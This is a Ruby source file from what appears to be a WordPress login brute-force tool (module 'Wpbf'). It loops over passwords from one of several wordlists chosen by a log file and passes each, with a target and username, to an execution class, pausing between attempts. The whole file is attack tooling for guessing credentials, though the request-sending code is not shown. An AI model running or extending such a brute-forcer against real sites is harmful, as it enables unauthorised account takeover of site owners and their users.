module Wpbf

	class One

		def initialize(target,username,delay)
			files = File.readlines("logs/wp-bruteforce/1.txt")
			fsize = 0..files.size.to_i - 1
			fsize.each_with_index do |l|
				a = get_dict(files[l])
				x_Array = 0..a.size.to_i - 1
				x_Array.each_with_index do |x|
					pwd = "#{a[x]}".gsub("\n","")
					Wpbf::Execution.new(target,username,pwd)
					sleep(delay)
				end
			end
		end

		def get_dict(x)
			if x.to_i == 1
				return File.readlines('wordlists/hk.txt')
			elsif x.to_i == 2
				return File.readlines('wordlists/hb.txt')
			elsif x.to_i == 3
				return File.readlines('wordlists/ak.txt')
			elsif x.to_i == 4
				return File.readlines('wordlists/sym.txt')
			else
				return false
			end
		end

	end # End Class

end # End Module